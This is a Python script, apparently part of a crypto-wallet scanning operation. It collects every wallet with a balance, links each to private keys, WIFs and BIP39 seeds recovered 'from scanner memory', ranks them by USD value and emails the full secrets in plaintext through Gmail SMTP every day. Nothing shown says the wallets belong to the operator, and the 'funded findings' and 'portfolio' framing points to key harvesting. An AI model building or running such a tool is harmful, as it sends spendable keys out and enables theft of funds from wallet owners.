#!/usr/bin/env python3
"""
Daily funded-findings email reporter.

Collects every nonzero-balance wallet from the live cache, reverse-links
HEX / WIF / BIP39 seed material from scanner memory, and emails a full
plaintext report once per day (default local noon).

Usage:
    python3 ~/daily_funded_report.py              # send if due (noon gate)
    python3 ~/daily_funded_report.py --force      # send now (ignore noon/once-a-day)
    python3 ~/daily_funded_report.py --dry-run    # print report, no email
    python3 ~/daily_funded_report.py --status     # show last send + next window

SMTP settings from ~/.env:
    SMTP_SERVER  SMTP_PORT  SMTP_USER  SMTP_PASS  REPORT_EMAIL
    REPORT_HOUR  REPORT_MINUTE
"""
from __future__ import annotations

import argparse
import json
import os
import smtplib
import ssl
import sys
import time
import traceback
from datetime import datetime, timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

HOME = Path.home()
sys.path.insert(0, str(HOME))

LOG = HOME / "daily_funded_report.log"
STATE_FILE = HOME / ".daily_report_state.json"
EXPORT_DIR = HOME / "forensic_exports"


def _ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(msg: str) -> None:
    line = f"[{_ts()}] {msg}"
    try:
        print(line, flush=True)
    except Exception:
        pass
    try:
        with LOG.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except OSError:
        pass


def load_dotenv(path: Optional[Path] = None) -> None:
    env_path = path or (HOME / ".env")
    if not env_path.exists():
        return
    try:
        for raw in env_path.read_text(encoding="utf-8", errors="ignore").splitlines():
            line = raw.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            k, v = k.strip(), v.strip().strip('"').strip("'")
            if k and v:
                os.environ.setdefault(k, v)
    except OSError:
        pass


def smtp_creds() -> Dict[str, str]:
    load_dotenv()
    # Gmail app passwords are 16 chars; strip spaces people paste with groups.
    raw_pass = os.environ.get("SMTP_PASS", "") or ""
    raw_pass = raw_pass.strip().strip('"').strip("'").replace(" ", "").replace("	", "")
    return {
        "SMTP_SERVER": os.environ.get("SMTP_SERVER", "smtp.gmail.com").strip(),
        "SMTP_PORT": os.environ.get("SMTP_PORT", "465").strip(),
        "SMTP_USER": os.environ.get("SMTP_USER", "").strip(),
        "SMTP_PASS": raw_pass,
        "REPORT_EMAIL": os.environ.get("REPORT_EMAIL", "").strip(),
        "REPORT_HOUR": os.environ.get("REPORT_HOUR", "12").strip(),
        "REPORT_MINUTE": os.environ.get("REPORT_MINUTE", "0").strip(),
    }


def load_state() -> dict:
    try:
        if STATE_FILE.exists():
            return json.loads(STATE_FILE.read_text(encoding="utf-8"))
    except Exception:
        pass
    return {}


def save_state(state: dict) -> None:
    try:
        tmp = STATE_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps(state, indent=2), encoding="utf-8")
        tmp.replace(STATE_FILE)
    except OSError as exc:
        log(f"state save failed: {exc}")


def already_sent_today(state: dict, now: Optional[datetime] = None) -> bool:
    now = now or datetime.now()
    last = (state.get("last_sent_local_date") or "").strip()
    return last == now.strftime("%Y-%m-%d")


def in_send_window(creds: dict, now: Optional[datetime] = None, width_min: int = 20) -> bool:
    """True if local time is within [REPORT_HOUR:REPORT_MINUTE, +width_min)."""
    now = now or datetime.now()
    try:
        hour = int(creds.get("REPORT_HOUR") or 12)
        minute = int(creds.get("REPORT_MINUTE") or 0)
    except ValueError:
        hour, minute = 12, 0
    hour = max(0, min(23, hour))
    minute = max(0, min(59, minute))
    start = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
    end = start + timedelta(minutes=max(5, width_min))
    # If window crosses midnight, still OK for normal noon.
    return start <= now < end


def next_send_time(creds: dict, now: Optional[datetime] = None) -> datetime:
    now = now or datetime.now()
    try:
        hour = int(creds.get("REPORT_HOUR") or 12)
        minute = int(creds.get("REPORT_MINUTE") or 0)
    except ValueError:
        hour, minute = 12, 0
    candidate = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
    if candidate <= now:
        candidate = candidate + timedelta(days=1)
    return candidate


def collect_funded_dossiers() -> Tuple[List[dict], dict]:
    """Build live funded dossiers with full key material.

    Returns (list_of_dossier_dicts, meta).
    """
    import wallet_view as wv
    import wallet_forensic as wf

    t0 = time.time()
    st = wf.ForensicState(max_wallets=0, funded_only=True)
    st.snapshot(force_gather=True)
    # Hard live rescore
    st.reload_balances()
    st.rebuild_ranked()

    try:
        prices = wv.get_usd_prices()
    except Exception:
        prices = {}

    try:
        from contract_filter import is_real_wallet as _cf_real
    except Exception:
        _cf_real = None

    dossiers: List[dict] = []
    for rank_i, row in enumerate(st.ranked or []):
        total, pend, chk, ts, w = row
        if float(total) <= 1e-12:
            continue
        # Skip known infrastructure addresses (contracts, tokens, bridges, exchanges)
        typ = (w.get("type") or "").upper()
        key_full = w.get("key") or ""
        if typ == "ADDR" and key_full and _cf_real is not None:
            # For ADDR-type "wallets", check if the address itself is infrastructure
            parts = key_full.split(":", 1)
            chain = parts[0] if len(parts) == 2 else "eth"
            addr = parts[1] if len(parts) == 2 else key_full
            if not _cf_real(chain, addr):
                continue  # skip — this is a contract/bridge/token, not a wallet
        try:
            wv.ensure_derived(w)
        except Exception:
            pass
        # Reverse-link keys from memory for ADDR hits
        try:
            # attach_memory_meta expects list
            shaped = wf.attach_memory_meta([w], max_bytes=wf.MEMORY_DEEP_BYTES)
            if shaped:
                w = shaped[0]
        except Exception:
            pass

        rows = wf.wallet_addr_rows(w, st.balances, st.meta)
        funded_rows = []
        live_sum = 0.0
        for r in rows:
            if r.get("noise"):
                continue
            bal = r.get("balance")
            if isinstance(bal, (int, float)) and bal > 1e-12:
                usd = None
                try:
                    usd = wv.usd_value(r["chain"], bal, prices)
                except Exception:
                    usd = None
                funded_rows.append({
                    "chain": r["chain"],
                    "address": r["address"],
                    "balance": float(bal),
                    "usd": usd,
                    "age": r.get("meta", {}).get("ts") if isinstance(r.get("meta"), dict) else None,
                    "live": bool((r.get("meta") or {}).get("live")),
                })
                live_sum += float(bal)
        if live_sum <= 1e-12 and float(total) <= 1e-12:
            continue
        if live_sum > 0:
            total = live_sum

        typ = (w.get("type") or "?").upper()
        key_full = w.get("key") or ""
        secrets = {
            "type": typ,
            "key_full": key_full,
            "linked_hex": w.get("_linked_hex") or "",
            "linked_hexes": list(w.get("_linked_hexes") or []),
            "linked_wif": w.get("_linked_wif") or "",
            "linked_wifs": list(w.get("_linked_wifs") or []),
            "linked_seed": w.get("_linked_seed") or "",
            "linked_seeds": list(w.get("_linked_seeds") or []),
            "source": w.get("source") or "",
            "found_ts": w.get("timestamp") or "",
            "link_method": w.get("_link_method") or "",
        }
        # For HEX/WIF/SEED primary material is the key itself
        if typ == "HEX" and key_full and not secrets["linked_hex"]:
            secrets["linked_hex"] = key_full
        if typ == "WIF" and key_full and not secrets["linked_wif"]:
            secrets["linked_wif"] = key_full
        if typ == "SEED" and key_full and not secrets["linked_seed"]:
            secrets["linked_seed"] = key_full

        try:
            usd_total = wv.wallet_usd_total(w, st.balances, prices)
        except Exception:
            usd_total = None

        dossiers.append({
            "rank": rank_i + 1,
            "total_balance_units": float(total),
            "total_usd": usd_total,
            "pend": int(pend),
            "chk": int(chk),
            "secrets": secrets,
            "funded_addresses": funded_rows,
            "n_chains": len(funded_rows),
        })

    meta = {
        "collected_at": datetime.now().isoformat(timespec="seconds"),
        "n_funded": len(dossiers),
        "portfolio_units": sum(d["total_balance_units"] for d in dossiers),
        "portfolio_usd": sum(
            (d["total_usd"] or 0.0) for d in dossiers if d.get("total_usd") is not None
        ),
        "gather_ms": getattr(st, "gather_ms", 0),
        "bal_ms": getattr(st, "bal_ms", 0),
        "elapsed_s": round(time.time() - t0, 2),
        "prices": prices,
    }
    return dossiers, meta


def _fmt_usd(u) -> str:
    if u is None:
        return "n/a"
    try:
        u = float(u)
    except (TypeError, ValueError):
        return "n/a"
    if abs(u) < 0.01:
        return f"${u:.4f}"
    if abs(u) < 1000:
        return f"${u:,.2f}"
    if abs(u) < 1_000_000:
        return f"${u/1000:,.2f}k"
    return f"${u/1_000_000:,.2f}M"


def build_report_text(dossiers: List[dict], meta: dict) -> str:
    lines: List[str] = []
    lines.append("=" * 72)
    lines.append("DAILY FUNDED FINDINGS REPORT — LIVE PRODUCTION")
    lines.append(f"Generated: {meta.get('collected_at')}")
    lines.append(f"Funded wallets: {meta.get('n_funded')}")
    lines.append(
        f"Portfolio (token units sum): {meta.get('portfolio_units', 0):,.10f}"
    )
    lines.append(f"Portfolio USD (approx): {_fmt_usd(meta.get('portfolio_usd'))}")
    lines.append(
        f"Collect time: {meta.get('elapsed_s')}s  "
        f"gather={meta.get('gather_ms')}ms bal={meta.get('bal_ms')}ms"
    )
    lines.append("=" * 72)
    lines.append("")
    lines.append(
        "WARNING: This email contains FULL private keys, WIFs, and BIP39 seeds."
    )
    lines.append("Treat as highly confidential. Do not forward.")
    lines.append("")

    if not dossiers:
        lines.append("No funded wallets found in the live cache right now.")
        lines.append("Scanner may still be catching up — check walletx / dashgo.")
        lines.append("")
        lines.append("-" * 72)
        return "\n".join(lines)

    for d in dossiers:
        sec = d.get("secrets") or {}
        lines.append("-" * 72)
        lines.append(
            f"RANK #{d['rank']} / {meta.get('n_funded')}  ·  "
            f"TYPE={sec.get('type')}  ·  "
            f"BAL={d['total_balance_units']:,.12f}  ·  "
            f"USD≈{_fmt_usd(d.get('total_usd'))}"
        )
        lines.append("-" * 72)
        lines.append(f"SOURCE: {sec.get('source') or '(unknown)'}")
        lines.append(f"FOUND:  {sec.get('found_ts') or 'n/a'}")
        if sec.get("link_method"):
            lines.append(f"LINK:   {sec.get('link_method')}")
        lines.append("")

        # Primary key material
        typ = (sec.get("type") or "").upper()
        key_full = sec.get("key_full") or ""
        if typ in ("HEX", "WIF", "SEED") and key_full:
            lines.append(f"PRIMARY {typ} (COMPLETE):")
            lines.append(key_full)
            lines.append("")

        # Linked secrets (always dump full)
        if sec.get("linked_seed"):
            lines.append("BIP39 / SEED (COMPLETE):")
            lines.append(sec["linked_seed"])
            lines.append("")
        for i, s in enumerate(sec.get("linked_seeds") or []):
            if s and s != sec.get("linked_seed"):
                lines.append(f"BIP39 / SEED [{i}] (COMPLETE):")
                lines.append(s)
                lines.append("")

        if sec.get("linked_hex"):
            lines.append("PRIVATE KEY HEX (COMPLETE):")
            lines.append(sec["linked_hex"])
            lines.append("")
        for i, h in enumerate(sec.get("linked_hexes") or []):
            if h and h != sec.get("linked_hex"):
                lines.append(f"PRIVATE KEY HEX [{i}] (COMPLETE):")
                lines.append(h)
                lines.append("")

        if sec.get("linked_wif"):
            lines.append("WIF (COMPLETE):")
            lines.append(sec["linked_wif"])
            lines.append("")
        for i, wif in enumerate(sec.get("linked_wifs") or []):
            if wif and wif != sec.get("linked_wif"):
                lines.append(f"WIF [{i}] (COMPLETE):")
                lines.append(wif)
                lines.append("")

        # If ADDR with no linked secret, still show the address key field
        if typ == "ADDR" and key_full:
            if not any([
                sec.get("linked_hex"), sec.get("linked_wif"), sec.get("linked_seed"),
                sec.get("linked_hexes"), sec.get("linked_wifs"), sec.get("linked_seeds"),
            ]):
                lines.append("ADDRESS KEY (no linked privkey/seed found in memory yet):")
                lines.append(key_full)
                lines.append("")

        lines.append("FUNDED ADDRESSES:")
        if not d.get("funded_addresses"):
            lines.append("  (none with live nonzero balance)")
        for fr in d.get("funded_addresses") or []:
            live = "LIVE" if fr.get("live") else ""
            lines.append(
                f"  {str(fr.get('chain') or '?').upper():6}  "
                f"{fr.get('address')}  "
                f"bal={float(fr.get('balance') or 0):.12f}  "
                f"usd≈{_fmt_usd(fr.get('usd'))}  {live}"
            )
        lines.append("")

    lines.append("=" * 72)
    lines.append("END OF REPORT — live production data only, no mocks.")
    lines.append("=" * 72)
    return "\n".join(lines)


def save_local_copy(text: str, meta: dict) -> Path:
    EXPORT_DIR.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%dT%H%M%S")
    path = EXPORT_DIR / f"daily_funded_report_{ts}.txt"
    path.write_text(text, encoding="utf-8")
    # also write json sidecar with structured dossiers if present in meta
    return path


def send_email(creds: dict, subject: str, body: str) -> None:
    user = creds.get("SMTP_USER") or ""
    password = creds.get("SMTP_PASS") or ""
    to_addr = creds.get("REPORT_EMAIL") or user
    server = creds.get("SMTP_SERVER") or "smtp.gmail.com"
    try:
        port = int(creds.get("SMTP_PORT") or 465)
    except ValueError:
        port = 465

    if not user or not password or not to_addr:
        raise RuntimeError(
            "SMTP_USER / SMTP_PASS / REPORT_EMAIL missing — set them in ~/.env"
        )

    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = user
    msg["To"] = to_addr
    msg.attach(MIMEText(body, "plain", "utf-8"))

    context = ssl.create_default_context()
    last_err = None
    # Try configured port first, then the other common Gmail port.
    ports_try = [port]
    for alt in (465, 587):
        if alt not in ports_try:
            ports_try.append(alt)
    for p in ports_try:
        try:
            if p == 465:
                with smtplib.SMTP_SSL(server, p, context=context, timeout=45) as smtp:
                    smtp.login(user, password)
                    smtp.sendmail(user, [to_addr], msg.as_string())
            else:
                with smtplib.SMTP(server, p, timeout=45) as smtp:
                    smtp.ehlo()
                    smtp.starttls(context=context)
                    smtp.ehlo()
                    smtp.login(user, password)
                    smtp.sendmail(user, [to_addr], msg.as_string())
            return
        except Exception as exc:
            last_err = exc
            continue
    raise RuntimeError(f"SMTP failed on ports {ports_try}: {last_err}")


def run_report(*, force: bool = False, dry_run: bool = False) -> int:
    creds = smtp_creds()
    state = load_state()
    now = datetime.now()

    if not force and not dry_run:
        if already_sent_today(state, now):
            log(f"already sent today ({state.get('last_sent_local_date')}) — skip")
            return 0
        if not in_send_window(creds, now):
            nxt = next_send_time(creds, now)
            log(
                f"outside send window (want {creds.get('REPORT_HOUR')}:"
                f"{int(creds.get('REPORT_MINUTE') or 0):02d} local) — "
                f"next {nxt.isoformat(timespec='minutes')} — skip"
            )
            return 0

    log("collecting funded dossiers (live)...")
    try:
        dossiers, meta = collect_funded_dossiers()
    except Exception as exc:
        log(f"collect FAILED: {exc}")
        log(traceback.format_exc(limit=12))
        if not dry_run and force:
            # still try to email the error so you know the job ran
            try:
                send_email(
                    creds,
                    subject=f"[CRYPTO] Daily funded report FAILED {now.strftime('%Y-%m-%d')}",
                    body=f"Collection failed at {now.isoformat()}\n\n{exc}\n\n{traceback.format_exc()}",
                )
            except Exception as e2:
                log(f"error-email also failed: {e2}")
        return 1

    body = build_report_text(dossiers, meta)
    local_path = save_local_copy(body, meta)
    log(f"local copy → {local_path}  funded={meta.get('n_funded')}")

    if dry_run:
        print(body)
        log("dry-run — not emailed")
        return 0

    n = int(meta.get("n_funded") or 0)
    usd = meta.get("portfolio_usd")
    subject = (
        f"[CRYPTO] {n} funded wallet{'s' if n != 1 else ''} "
        f"· {_fmt_usd(usd)} · {now.strftime('%Y-%m-%d %H:%M')}"
    )
    try:
        send_email(creds, subject=subject, body=body)
    except Exception as exc:
        log(f"SMTP send FAILED: {exc}")
        log(traceback.format_exc(limit=8))
        state["last_error"] = str(exc)
        state["last_error_at"] = now.isoformat(timespec="seconds")
        save_state(state)
        return 2

    state["last_sent_local_date"] = now.strftime("%Y-%m-%d")
    state["last_sent_at"] = now.isoformat(timespec="seconds")
    state["last_n_funded"] = n
    state["last_portfolio_usd"] = usd
    state["last_local_path"] = str(local_path)
    state["last_error"] = ""
    save_state(state)
    log(f"EMAILED OK → {creds.get('REPORT_EMAIL')}  subject={subject!r}")
    return 0


def status() -> int:
    creds = smtp_creds()
    state = load_state()
    now = datetime.now()
    print(f"now local     : {now.isoformat(timespec='seconds')}")
    print(
        f"send window   : each day at "
        f"{int(creds.get('REPORT_HOUR') or 12):02d}:"
        f"{int(creds.get('REPORT_MINUTE') or 0):02d} local "
        f"(+20min gate)"
    )
    print(f"next send     : {next_send_time(creds, now).isoformat(timespec='minutes')}")
    print(f"in window now : {in_send_window(creds, now)}")
    print(f"already today : {already_sent_today(state, now)}")
    print(f"SMTP user     : {creds.get('SMTP_USER') or '(unset)'}")
    print(f"REPORT_EMAIL  : {creds.get('REPORT_EMAIL') or '(unset)'}")
    print(f"SMTP server   : {creds.get('SMTP_SERVER')}:{creds.get('SMTP_PORT')}")
    print(f"pass set      : {'yes' if creds.get('SMTP_PASS') else 'NO'}")
    print(f"last sent     : {state.get('last_sent_at') or 'never'}")
    print(f"last funded n : {state.get('last_n_funded')}")
    print(f"last usd      : {state.get('last_portfolio_usd')}")
    print(f"last path     : {state.get('last_local_path')}")
    print(f"last error    : {state.get('last_error') or '(none)'}")
    print(f"state file    : {STATE_FILE}")
    print(f"log           : {LOG}")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="Daily funded findings email reporter")
    ap.add_argument("--force", action="store_true", help="send now (ignore noon / once-a-day)")
    ap.add_argument("--dry-run", action="store_true", help="print report, do not email")
    ap.add_argument("--status", action="store_true", help="show schedule + last send")
    args = ap.parse_args()
    if args.status:
        return status()
    return run_report(force=args.force, dry_run=args.dry_run)


if __name__ == "__main__":
    sys.exit(main())
